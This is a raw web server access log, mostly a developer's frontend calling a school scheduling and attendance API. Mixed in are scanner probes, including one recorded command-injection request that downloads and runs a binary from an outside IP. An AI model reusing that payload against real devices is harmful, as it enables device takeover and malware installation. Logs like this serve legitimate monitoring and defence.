118.70.191.159 - - [07/May/2025:19:09:42 +0000] "GET / HTTP/1.1" 504 569 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "OPTIONS /api-nodejs/classrooms HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "OPTIONS /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "OPTIONS /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "OPTIONS /api-nodejs/classrooms HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "GET /api-nodejs/classrooms HTTP/1.1" 200 1480 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1105501 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:39 +0000] "GET /api-nodejs/schedules/all?className=&userId=&teacherId=&classId=&subjectId=&fromDate=&toDate=&dayOfWeek=&slotId=&weekNumber=&semesterId=&studentId= HTTP/1.1" 200 1105501 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
161.248.238.13 - - [08/May/2025:08:18:55 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
161.248.238.13 - - [08/May/2025:08:18:55 +0000] "" 400 0 "-" "-"
116.96.77.176 - - [08/May/2025:08:18:55 +0000] "OPTIONS /api-nodejs/classes?academicYear=2023-2024 HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:55 +0000] "OPTIONS /api-nodejs/schedules/teachers-by-subject/1 HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:55 +0000] "GET /api-nodejs/schedules/teachers-by-subject/1 HTTP/1.1" 200 5772 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:55 +0000] "GET /api-nodejs/classes?academicYear=2023-2024 HTTP/1.1" 200 1981 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:56 +0000] "GET /api-nodejs/schedules/882 HTTP/1.1" 404 156 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:18:57 +0000] "GET /api-nodejs/attendance/schedule/882 HTTP/1.1" 200 24150 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:09 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:09 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 704 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:10 +0000] "GET /api-nodejs/attendance/schedule/882 HTTP/1.1" 200 24206 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:33 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:33 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 701 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:19:33 +0000] "GET /api-nodejs/attendance/schedule/882 HTTP/1.1" 200 24264 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
161.248.238.13 - - [08/May/2025:08:21:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
161.248.238.13 - - [08/May/2025:08:21:43 +0000] "" 400 0 "-" "-"
193.34.212.110 - - [08/May/2025:08:25:13 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20llarm7%3B%20wget%20http%3A%2F%2F103.188.82.240%2Fllarm7%3B%20chmod%20777%20%2A%3B%20.%2Fllarm7%20xpl5 HTTP/1.1" 404 150 "-" "Mozila/5.0"
116.96.77.176 - - [08/May/2025:08:25:29 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:25:30 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 705 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:25:30 +0000] "GET /api-nodejs/attendance/schedule/882 HTTP/1.1" 200 24322 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
161.248.238.13 - - [08/May/2025:08:26:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://14.225.204.42:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
161.248.238.13 - - [08/May/2025:08:26:34 +0000] "" 400 0 "-" "-"
116.96.77.176 - - [08/May/2025:08:28:03 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:28:03 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 200 703 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:28:04 +0000] "GET /api-nodejs/attendance/schedule/882 HTTP/1.1" 200 24380 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
154.81.156.35 - - [08/May/2025:08:28:54 +0000] "GET / HTTP/1.1" 200 1745 "-" "curl/7.81.0"
116.96.77.176 - - [08/May/2025:08:31:28 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:28 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 400 119 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:42 +0000] "OPTIONS /api-nodejs/attendance/check-in HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:42 +0000] "PUT /api-nodejs/attendance/check-in HTTP/1.1" 400 119 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:51 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:51 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:54 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:54 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:55 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:55 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 86 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:55 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:56 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:56 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:31:56 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:08 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:09 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:09 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:09 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:15 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:16 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:17 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:18 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:18 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:18 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:19 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:20 +0000] "OPTIONS /api-nodejs/auth/login HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:20 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 401 97 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:20 +0000] "OPTIONS /api-nodejs/auth/refresh-token HTTP/1.1" 204 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
116.96.77.176 - - [08/May/2025:08:32:20 +0000] "POST /api-nodejs/auth/refresh-token HTTP/1.1" 401 82 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
